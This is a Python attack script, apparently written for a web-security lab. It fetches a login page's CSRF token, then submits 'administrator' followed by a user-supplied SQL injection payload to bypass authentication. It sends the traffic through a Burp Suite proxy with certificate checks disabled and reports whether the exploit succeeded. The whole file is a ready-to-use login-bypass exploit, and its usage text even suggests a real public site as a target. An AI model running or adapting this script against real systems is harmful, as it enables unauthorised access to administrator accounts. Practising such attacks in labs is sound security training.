import sys
from typing import Optional, cast

import requests
import urllib3
from bs4 import BeautifulSoup
from bs4.element import Tag

urllib3.disable_warnings()

# let the script go through the burp suite proxy
# for debuging purposes
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def get_csrf_token(session, base_url):
    r = session.get(base_url, proxies=proxies, verify=False, timeout=5)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf: Optional[Tag] = cast(Tag, soup.find("input", type="hidden"))

    if csrf is not None:
        return csrf["value"]

    return "not csrf token"


def exploit_sqli(session, base_url, payload_entered):
    # this time we want to URL encode the params:
    csrf = get_csrf_token(session, base_url)
    print(csrf)
    username = "administrator" + payload_entered
    data = {"csrf": csrf, "username": username, "password": "randomtext"}

    r = session.post(base_url, data=data, proxies=proxies, verify=False, timeout=5)
    if "Log out" in r.text:
        return True
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()

    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url> <payload>")
        print(f'[-] Example: {sys.argv[0]} www.google.com" "1=1"')
        sys.exit(-1)

    s = requests.Session()

    if exploit_sqli(s, url, payload):
        print("[+] Exploit successful")
    else:
        print("[-] Exploit failed")
